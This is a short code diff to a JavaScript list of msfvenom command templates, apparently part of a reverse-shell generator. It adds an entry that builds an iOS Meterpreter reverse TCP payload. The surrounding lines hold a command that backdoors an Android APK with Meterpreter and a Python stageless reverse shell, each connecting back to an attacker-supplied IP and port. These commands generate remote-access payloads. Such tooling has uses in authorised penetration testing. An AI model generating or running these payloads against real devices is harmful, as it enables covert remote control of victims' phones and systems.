@@ -453,6 +453,11 @@ const msfvenomCommands =  withCommandType(
             "command": "msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
             "meta": ["msfvenom", "android", "android", "reverse"]
         },
+	{
+            "name": "Apple iOS Meterpreter Reverse TCP Inline",
+            "command": "msfvenom -p apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload",
+            "meta": ["msfvenom", "apple_ios", "apple_ios", "reverse"]
+        },
         {
             "name": "Python Stageless Reverse TCP",
             "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
